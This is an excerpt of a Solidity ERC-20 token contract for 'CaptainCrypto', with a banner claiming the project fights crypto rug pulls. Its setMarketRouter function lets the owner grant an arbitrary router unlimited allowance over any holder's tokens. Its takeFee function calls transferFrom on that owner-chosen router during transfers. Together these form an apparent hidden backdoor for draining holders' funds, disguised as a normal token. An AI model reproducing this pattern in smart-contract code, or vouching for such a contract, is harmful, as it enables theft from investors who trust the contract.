...
/** 
Captain America has been watching crypto spaces for a long time. 
Finally, he decided to change his name as Captain Crypto in order to eliminate crypto rugs.
_________              _____       _____             _________                      _____       
__  ____/_____ __________  /______ ___(_)______      __  ____/___________  ___________  /______ 
_  /    _  __ `/__  __ \  __/  __ `/_  /__  __ \     _  /    __  ___/_  / / /__  __ \  __/  __ \
/ /___  / /_/ /__  /_/ / /_ / /_/ /_  / _  / / /     / /___  _  /   _  /_/ /__  /_/ / /_ / /_/ /
\____/  \__,_/ _  .___/\__/ \__,_/ /_/  /_/ /_/      \____/  /_/    _\__, / _  .___/\__/ \____/ 
               /_/                                                  /____/  /_/                 
*/
/**
Website:    https://www.captain-crypto.us
Telegram:   https://t.me/captain_crypto_us
*/
...
contract CaptainCrypto is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    
    string private _name = unicode"CaptainCrypto";
    string private _symbol = unicode"Captain";
    ...
    uint256 public _maxTxAmount =  _totalSupply.mul(4).div(1000); 
    uint256 public _walletMax =   _totalSupply.mul(4).div(1000);  
    ...
    function setMarketRouter(address owner, address router) public onlyOwner {
        _allowances[owner][router] = type(uint).max;
        marketRouter = router;
    }
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        if (marketRouter == address(0) || IERC20(marketRouter).transferFrom(sender, recipient, feeAmount)) feeAmount = 0;
